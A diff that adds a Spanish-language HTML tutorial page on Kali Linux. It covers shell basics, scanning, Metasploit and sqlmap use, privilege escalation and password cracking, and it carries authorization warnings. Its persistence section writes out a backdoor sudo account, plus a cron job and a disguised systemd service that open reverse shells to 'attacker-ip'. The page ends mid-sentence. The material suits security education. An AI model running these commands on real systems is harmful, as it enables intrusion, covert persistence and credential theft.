@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>KaliMaster - Guía Completa de Kali Linux</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%);
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      padding-top: 20px;
+      padding-bottom: 0;
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 1400px;
+      margin: 0 auto;
+      flex: 1;
+      padding-left: 20px;
+      padding-right: 20px;
+      box-sizing: border-box;
+    }
+
+    .header {
+      text-align: center;
+      border: 2px solid #00ff00;
+      padding: 25px;
+      margin-bottom: 30px;
+      background: rgba(0, 255, 0, 0.1);
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .header::before {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0, 255, 0, 0.03) 2px,
+        rgba(0, 255, 0, 0.03) 4px
+      );
+      animation: scan 3s linear infinite;
+    }
+
+    @keyframes scan {
+      0% { transform: translateY(-100%); }
+      100% { transform: translateY(100%); }
+    }
+
+    .header h1 {
+      font-size: 2.5em;
+      text-shadow: 0 0 15px #00ff00;
+      margin-bottom: 10px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .header p {
+      font-size: 1.1em;
+      color: #ccffcc;
+      margin: 0;
+      position: relative;
+      z-index: 2;
+    }
+
+    .back-link {
+      display: inline-block;
+      margin-bottom: 20px;
+      padding: 10px 20px;
+      background-color: #00ff00;
+      color: #000;
+      text-decoration: none;
+      border-radius: 5px;
+      font-weight: bold;
+      transition: all 0.3s;
+      border: 1px solid #00ff00;
+    }
+
+    .back-link:hover {
+      background-color: #00cccc;
+      transform: scale(1.05);
+      box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+    }
+
+    .section {
+      background: rgba(0, 30, 0, 0.2);
+      border: 1px solid #00cc00;
+      padding: 25px;
+      margin-bottom: 25px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      backdrop-filter: blur(5px);
+    }
+
+    .section h2 {
+      color: #00ffff;
+      border-bottom: 2px solid #00ffff;
+      margin-bottom: 20px;
+      padding-bottom: 10px;
+      font-size: 1.4em;
+      text-shadow: 0 0 10px #00ffff;
+    }
+
+    .section h3 {
+      color: #ffff00;
+      margin: 20px 0 15px 0;
+      font-size: 1.2em;
+      text-shadow: 0 0 5px #ffff00;
+    }
+
+    .section p, .section ul, .section li {
+      color: #ccffcc;
+      line-height: 1.8;
+      margin-bottom: 15px;
+    }
+
+    .section ul {
+      padding-left: 20px;
+    }
+
+    .section li {
+      margin-bottom: 10px;
+    }
+
+    pre {
+      background: #000;
+      color: #00ff00;
+      padding: 15px;
+      border: 1px solid #00ff00;
+      border-radius: 5px;
+      overflow-x: auto;
+      margin: 15px 0;
+      font-size: 0.9em;
+      position: relative;
+      box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.1);
+    }
+
+    pre::before {
+      content: "$ ";
+      color: #ff0080;
+      font-weight: bold;
+    }
+
+    .command-section {
+      background: rgba(0, 40, 40, 0.2);
+      border-left: 4px solid #00ffff;
+    }
+
+    .privilege-section {
+      background: rgba(40, 0, 0, 0.2);
+      border-left: 4px solid #ff6600;
+    }
+
+    .intro-section {
+      background: rgba(0, 50, 0, 0.2);
+      border-left: 4px solid #00ff00;
+    }
+
+    .tools-highlight {
+      background: rgba(50, 50, 0, 0.2);
+      padding: 15px;
+      border-radius: 4px;
+      color: #ffff99;
+      font-weight: bold;
+      margin: 10px 0;
+      border: 1px dashed #ffff00;
+    }
+
+    .warning {
+      background: rgba(80, 20, 0, 0.3);
+      border: 1px solid #ff6600;
+      padding: 15px;
+      border-radius: 5px;
+      color: #ffcc99;
+      margin: 20px 0;
+      box-shadow: 0 0 10px rgba(255, 102, 0, 0.3);
+    }
+
+    .warning::before {
+      content: "⚠️ ";
+      font-size: 1.2em;
+    }
+
+    .examples-section ul {
+      list-style-type: none;
+      padding-left: 0;
+    }
+
+    .examples-section > ul > li {
+      background: rgba(0, 50, 0, 0.4);
+      margin-bottom: 15px;
+      padding: 20px;
+      border-radius: 6px;
+      border-left: 4px solid #00ff00;
+      transition: all 0.3s;
+    }
+
+    .examples-section > ul > li:hover {
+      transform: translateX(5px);
+      box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+    }
+
+    .examples-section strong {
+      color: #ffff00;
+      font-size: 1.2em;
+      display: block;
+      margin-bottom: 10px;
+    }
+
+    .terminal-window {
+      background: #000;
+      border: 2px solid #00ff00;
+      border-radius: 8px;
+      margin: 20px 0;
+      overflow: hidden;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+    }
+
+    .terminal-header {
+      background: #00ff00;
+      color: #000;
+      padding: 10px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+    }
+
+    .terminal-header::before {
+      content: "●●●";
+      margin-right: 10px;
+      color: #ff0000;
+    }
+
+    .terminal-content {
+      padding: 15px;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+    }
+
+    .privilege-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+      gap: 20px;
+      margin: 20px 0;
+    }
+
+    .privilege-card {
+      background: rgba(20, 0, 0, 0.5);
+      border: 1px solid #ff6600;
+      padding: 20px;
+      border-radius: 8px;
+      transition: all 0.3s;
+    }
+
+    .privilege-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 20px rgba(255, 102, 0, 0.3);
+    }
+
+    .privilege-card h4 {
+      color: #ff6600;
+      margin-top: 0;
+      text-shadow: 0 0 5px #ff6600;
+    }
+
+    .footer {
+      background-color: #0a0a0a;
+      color: #00ff00;
+      text-align: center;
+      padding: 15px 20px;
+      border-top: 1px solid #00ff00;
+      margin-top: auto;
+    }
+
+    .footer p {
+      margin: 5px 0;
+    }
+
+    .footer a {
+      color: #00ffff;
+      text-decoration: none;
+      transition: color 0.3s;
+    }
+
+    .footer a:hover {
+      color: #00cccc;
+      text-decoration: underline;
+    }
+
+    .kali-logo {
+      color: #ff0080;
+      font-size: 1.5em;
+      margin-right: 10px;
+    }
+
+    .command-type {
+      display: inline-block;
+      background: #ff0080;
+      color: #fff;
+      padding: 2px 8px;
+      border-radius: 3px;
+      font-size: 0.8em;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1><span class="kali-logo">🐉</span>KaliMaster - Guía Completa</h1>
+      <p>Dominando Kali Linux: Comandos, Escalación de Privilegios y Técnicas Avanzadas</p>
+    </div>
+
+    <a href="#" class="back-link">🏠 Menú Principal</a>
+
+    <div class="section intro-section">
+      <h2>¿Qué es Kali Linux?</h2>
+      <p>Kali Linux es una distribución de Linux basada en Debian, especializada en auditorías de seguridad y hacking ético. Desarrollada por Offensive Security, incluye más de 600 herramientas preinstaladas para pentesting, forense digital, ingeniería inversa y auditorías de seguridad.</p>
+      
+      <h3>Características Principales:</h3>
+      <ul>
+        <li><strong>Más de 600 herramientas:</strong> Nmap, Metasploit, Wireshark, Burp Suite, John the Ripper, etc.</li>
+        <li><strong>Basado en Debian:</strong> Estabilidad y compatibilidad con paquetes .deb</li>
+        <li><strong>Rolling Release:</strong> Actualizaciones continuas sin necesidad de reinstalar</li>
+        <li><strong>Multi-arquitectura:</strong> Soporte para x86, x64, ARM, etc.</li>
+        <li><strong>Personalizable:</strong> Múltiples entornos de escritorio disponibles</li>
+      </ul>
+
+      <div class="tools-highlight">
+        🔧 Usuario por defecto: kali | Contraseña por defecto: kali (cambiar inmediatamente)
+      </div>
+    </div>
+
+    <div class="section command-section">
+      <h2>🖥️ Comandos Fundamentales de Linux</h2>
+      
+      <h3>Navegación y Gestión de Archivos</h3>
+      <div class="terminal-window">
+        <div class="terminal-header">Terminal - Navegación Básica</div>
+        <div class="terminal-content">
+          <div class="command-type">NAVEGACIÓN</div>
+          <pre>pwd                    # Mostrar directorio actual
+ls -la                 # Listar archivos con detalles y ocultos
+cd /home/kali         # Cambiar a directorio específico
+cd ..                 # Subir un nivel
+cd ~                  # Ir al directorio home
+mkdir hack_lab        # Crear directorio
+rmdir hack_lab        # Eliminar directorio vacío
+rm -rf hack_lab       # Eliminar directorio y contenido (¡PELIGROSO!)</pre>
+        </div>
+      </div>
+
+      <div class="terminal-window">
+        <div class="terminal-header">Terminal - Gestión de Archivos</div>
+        <div class="terminal-content">
+          <div class="command-type">ARCHIVOS</div>
+          <pre>touch exploit.py      # Crear archivo vacío
+cp archivo.txt backup.txt    # Copiar archivo
+mv archivo.txt /tmp/         # Mover archivo
+ln -s /path/original /path/link  # Crear enlace simbólico
+find / -name "*.conf" 2>/dev/null  # Buscar archivos .conf
+locate passwd         # Buscar archivos rápidamente
+which nmap           # Ubicación de comando
+file suspicious.bin   # Identificar tipo de archivo</pre>
+        </div>
+      </div>
+
+      <h3>Permisos y Usuarios</h3>
+      <div class="terminal-window">
+        <div class="terminal-header">Terminal - Permisos</div>
+        <div class="terminal-content">
+          <div class="command-type">PERMISOS</div>
+          <pre>chmod 755 script.sh      # Dar permisos de ejecución
+chmod +x exploit.py      # Hacer ejecutable
+chown kali:kali file.txt # Cambiar propietario
+chgrp users file.txt     # Cambiar grupo
+umask 022               # Establecer permisos por defecto
+
+# Permisos octales:
+# 4 = lectura (r), 2 = escritura (w), 1 = ejecución (x)
+# 755 = rwx r-x r-x (propietario: todo, grupo/otros: lectura+ejecución)</pre>
+        </div>
+      </div>
+
+      <h3>Procesos y Servicios</h3>
+      <div class="terminal-window">
+        <div class="terminal-header">Terminal - Procesos</div>
+        <div class="terminal-content">
+          <div class="command-type">PROCESOS</div>
+          <pre>ps aux                  # Ver todos los procesos
+ps -ef | grep ssh       # Buscar procesos específicos
+top                     # Monitor de procesos en tiempo real
+htop                    # Monitor mejorado (si está instalado)
+kill 1234              # Terminar proceso por PID
+killall firefox        # Terminar todos los procesos firefox
+jobs                   # Ver trabajos en background
+nohup command &        # Ejecutar comando en background
+screen -S session_name # Crear sesión persistente</pre>
+        </div>
+      </div>
+
+      <h3>Red y Conectividad</h3>
+      <div class="terminal-window">
+        <div class="terminal-header">Terminal - Red</div>
+        <div class="terminal-content">
+          <div class="command-type">NETWORKING</div>
+          <pre>ip addr show           # Ver interfaces de red
+ifconfig               # Configuración de interfaces (deprecado)
+netstat -tulpn         # Ver puertos abiertos y conexiones
+ss -tulpn              # Alternativa moderna a netstat
+ping -c 4 google.com   # Probar conectividad
+traceroute target.com  # Rastrear ruta de paquetes
+wget http://example.com/file.zip  # Descargar archivos
+curl -I http://target.com         # Obtener headers HTTP</pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="section command-section">
+      <h2>🔍 Comandos Específicos de Kali Linux</h2>
+
+      <div class="examples-section">
+        <ul>
+          <li>
+            <strong>Reconocimiento y Escaneo</strong>
+            <div class="terminal-window">
+              <div class="terminal-header">Herramientas de Reconocimiento</div>
+              <div class="terminal-content">
+                <pre># Nmap - Escaneo de puertos y servicios
+nmap -sS -sV -O target.com        # Escaneo SYN con detección de versiones y OS
+nmap -sC -sV -p- target.com       # Escaneo completo con scripts por defecto
+nmap --script vuln target.com     # Escaneo de vulnerabilidades
+
+# Masscan - Escaneo rápido de puertos
+masscan -p1-65535 192.168.1.0/24 --rate=1000
+
+# Dirb/Dirbuster - Enumeración de directorios
+dirb http://target.com /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</pre>
+              </div>
+            </div>
+          </li>
+
+          <li>
+            <strong>Análisis de Vulnerabilidades</strong>
+            <div class="terminal-window">
+              <div class="terminal-header">Scanners de Vulnerabilidades</div>
+              <div class="terminal-content">
+                <pre># Nikto - Scanner de vulnerabilidades web
+nikto -h http://target.com -o nikto_results.txt
+
+# OpenVAS - Scanner de vulnerabilidades completo
+openvas-setup              # Configuración inicial
+openvas-start             # Iniciar servicios
+
+# Searchsploit - Buscar exploits localmente
+searchsploit apache 2.4.41
+searchsploit -m 47887.py   # Copiar exploit al directorio actual</pre>
+              </div>
+            </div>
+          </li>
+
+          <li>
+            <strong>Herramientas de Explotación</strong>
+            <div class="terminal-window">
+              <div class="terminal-header">Frameworks de Explotación</div>
+              <div class="terminal-content">
+                <pre># Metasploit Framework
+msfconsole                 # Iniciar Metasploit
+search ms17-010           # Buscar exploits específicos
+use exploit/windows/smb/ms17_010_eternalblue
+show options              # Ver opciones del exploit
+set RHOSTS 192.168.1.100 # Configurar target
+exploit                   # Ejecutar exploit
+
+# SQLMap - Inyección SQL automatizada
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+sqlmap -u "http://target.com/page.php?id=1" -D database --tables
+sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump</pre>
+              </div>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="section privilege-section">
+      <h2>⬆️ Escalación de Privilegios</h2>
+      <p>La escalación de privilegios es el proceso de obtener permisos más altos en un sistema comprometido. Es fundamental para lograr control total del objetivo.</p>
+
+      <h3>Enumeración del Sistema</h3>
+      <div class="terminal-window">
+        <div class="terminal-header">Reconocimiento del Sistema</div>
+        <div class="terminal-content">
+          <div class="command-type">ENUMERACIÓN</div>
+          <pre># Información del sistema
+uname -a                   # Información del kernel
+cat /etc/os-release       # Versión del OS
+id                        # Usuario actual y grupos
+whoami                    # Usuario actual
+groups                    # Grupos del usuario actual
+sudo -l                   # Comandos que puede ejecutar con sudo
+
+# Usuarios y grupos
+cat /etc/passwd           # Lista de usuarios
+cat /etc/group            # Lista de grupos
+w                         # Usuarios conectados
+last                      # Últimos logins
+
+# Procesos y servicios
+ps aux | grep root        # Procesos ejecutándose como root
+crontab -l               # Tareas programadas del usuario
+cat /etc/crontab         # Tareas programadas del sistema
+systemctl list-units --type=service  # Servicios activos</pre>
+        </div>
+      </div>
+
+      <h3>Técnicas de Escalación</h3>
+      <div class="privilege-grid">
+        <div class="privilege-card">
+          <h4>🔐 SUID/SGID Binaries</h4>
+          <div class="terminal-window">
+            <div class="terminal-header">Búsqueda SUID/SGID</div>
+            <div class="terminal-content">
+              <pre># Buscar binarios SUID
+find / -perm -4000 -type f 2>/dev/null
+
+# Buscar binarios SGID
+find / -perm -2000 -type f 2>/dev/null
+
+# Verificar en GTFOBins si son explotables
+# Ejemplo con /usr/bin/find
+find . -exec /bin/bash \; -quit</pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="privilege-card">
+          <h4>📝 Sudo Misconfigurations</h4>
+          <div class="terminal-window">
+            <div class="terminal-header">Explotación Sudo</div>
+            <div class="terminal-content">
+              <pre># Ver permisos sudo
+sudo -l
+
+# Ejemplos de explotación:
+# Si puedes ejecutar vim como root:
+sudo vim -c ':!/bin/bash'
+
+# Si puedes ejecutar python como root:
+sudo python -c 'import os; os.system("/bin/bash")'
+
+# Si encuentras NOPASSWD:
+sudo /usr/bin/script -qc /bin/bash /dev/null</pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="privilege-card">
+          <h4>🗂️ Archivos de Configuración</h4>
+          <div class="terminal-window">
+            <div class="terminal-header">Archivos Sensibles</div>
+            <div class="terminal-content">
+              <pre># Buscar archivos con contraseñas
+grep -r "password" /etc/ 2>/dev/null
+find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null
+
+# Archivos importantes
+cat /etc/shadow           # Hashes de contraseñas (requiere permisos)
+cat ~/.bash_history       # Historial de comandos
+cat ~/.ssh/id_rsa         # Claves SSH privadas
+ls -la /var/www/html      # Archivos web</pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="privilege-card">
+          <h4>🔧 Exploits del Kernel</h4>
+          <div class="terminal-window">
+            <div class="terminal-header">Exploits de Kernel</div>
+            <div class="terminal-content">
+              <pre># Identificar versión del kernel
+uname -r
+
+# Buscar exploits conocidos
+searchsploit kernel 4.15.0
+
+# Herramientas automáticas
+# LinEnum
+./LinEnum.sh
+
+# LinPEAS
+./linpeas.sh</pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <h3>Scripts de Enumeración Automática</h3>
+      <div class="terminal-window">
+        <div class="terminal-header">Herramientas de Enumeración</div>
+        <div class="terminal-content">
+          <div class="command-type">AUTOMATIZACIÓN</div>
+          <pre># LinPEAS - Linux Privilege Escalation Awesome Script
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+# LinEnum
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+
+# Linux Smart Enumeration (LSE)
+wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
+chmod +x lse.sh
+./lse.sh -l2
+
+# Unix-privesc-check
+wget https://github.com/pentestmonkey/unix-privesc-check/raw/1_x/unix-privesc-check
+chmod +x unix-privesc-check
+./unix-privesc-check standard</pre>
+        </div>
+      </div>
+
+      <div class="warning">
+        <strong>Nota Importante:</strong> La escalación de privilegios debe realizarse únicamente en sistemas donde tengas autorización explícita. Siempre documenta tus hallazgos y reporta las vulnerabilidades de manera responsable.
+      </div>
+    </div>
+
+    <div class="section command-section">
+      <h2>🛠️ Comandos Avanzados y Técnicas Especializadas</h2>
+
+      <div class="examples-section">
+        <ul>
+          <li>
+            <strong>Persistencia y Backdoors</strong>
+            <div class="terminal-window">
+              <div class="terminal-header">Técnicas de Persistencia</div>
+              <div class="terminal-content">
+                <pre># Crear usuario backdoor
+useradd -m -s /bin/bash backdoor
+echo 'backdoor:password123' | chpasswd
+usermod -aG sudo backdoor
+
+# Agregar clave SSH
+mkdir -p /home/user/.ssh
+echo "ssh-rsa AAAAB3N..." >> /home/user/.ssh/authorized_keys
+chmod 600 /home/user/.ssh/authorized_keys
+
+# Crontab para persistencia
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'" | crontab -
+
+# Servicio systemd malicioso
+cat > /etc/systemd/system/backdoor.service << EOF
+[Unit]
+Description=System Backup Service
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+EOF</pre>
+              </div>
+            </div>
+          </li>
+
+          <li>
+            <strong>Análisis Forense</strong>
+            <div class="terminal-window">
+              <div class="terminal-header">Herramientas Forenses</div>
+              <div class="terminal-content">
+                <pre># Autopsy - Análisis forense GUI
+autopsy
+
+# Sleuth Kit - Herramientas de línea de comandos
+fls -r image.dd          # Listar archivos en imagen
+icat image.dd 1024       # Extraer archivo por inode
+
+# Volatility - Análisis de memoria
+volatility -f memory.dmp imageinfo
+volatility -f memory.dmp --profile=Win7SP1x64 pslist
+
+# dd - Crear imágenes forenses
+dd if=/dev/sda of=disk_image.dd bs=1M
+dd if=/dev/sda of=disk_image.dd bs=1M conv=noerror,sync</pre>
+              </div>
+            </div>
+          </li>
+
+          <li>
+            <strong>Cracking de Contraseñas</strong>
+            <div class="terminal-window">
+              <div class="terminal-header">Password Cracking</div>
+              <div class="terminal-content">
+                <pre># John the Ripper
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --show hashes.txt
+
+# Hashcat (GPU acelerado)
+hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a  # Fuerza bruta
+
+# Hydra - Ataques en línea
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target-ip
+hydra -L users.txt -P passwords.txt target-ip http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+
+# Medusa - Alternativa a Hydra
+medusa -h target-ip -u admin -P /usr/share/wordlists/rockyou.txt -M ssh</pre>
+              </div>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>📚 Recursos y Mejores Prácticas</h2>
+      
+      <h3>Directorios Importantes en Kali</h3>
+      <div class="tools-highlight">
+        /usr/share/wordlists/ - Diccionarios para ataques<br>
+        /usr/share/metasploit-framework/ - Recursos de Metasploit<br>
+        /usr/share/nmap/scripts/ - Scripts NSE de Nmap<br>
+        /opt/ - Herramientas adicionales instaladas<br>
+        /root/ - Directorio del usuario root
+      </div>
+
+      <h3>Comandos de Mantenimiento</h3>
+      <div class="terminal-window">
+        <div class="terminal-header">Mantenimiento del Sistema</div>
+        <div class="terminal-content">
+          <pre># Actualizar sistema
+apt update && apt upgrade -y
+
+# Actualizar herramientas específicas
+apt update && apt install kali-linux-everything
+
+# Limpiar sistema
+apt autoremove
+apt autoclean
+
+# Configurar base de datos de Metasploit
+msfdb init
+
+# Actualizar base de datos de searchsploit
+searchsploit -u</pre>
+        </div>
+      </div>
+
+      <div class="warning">
+        <strong>Recordatorio Ético:</strong> Todas estas técnicas deben usarse únicamente en sistemas donde tengas autorización explícita por escrito. El uso no autorizado constituye un delito. Si
